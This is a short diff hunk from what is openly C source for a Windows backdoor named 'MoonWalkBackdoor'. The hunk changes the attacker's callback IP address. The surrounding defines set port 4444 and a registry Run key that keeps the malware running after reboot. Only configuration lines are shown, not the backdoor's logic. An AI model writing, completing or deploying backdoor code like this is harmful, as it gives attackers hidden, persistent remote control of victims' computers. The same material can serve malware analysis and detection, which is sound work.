@@ -18,7 +18,7 @@
 #include <winreg.h>
 
 #define PORT 4444
-#define SERVER_IP "192.168.1.10" // Attacker's IP
+#define SERVER_IP "192.168.10.50" // Attacker's IP
 #define BUFFER_SIZE 1024
 #define PERSISTENCE_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define PERSISTENCE_VALUE "MoonWalkBackdoor"
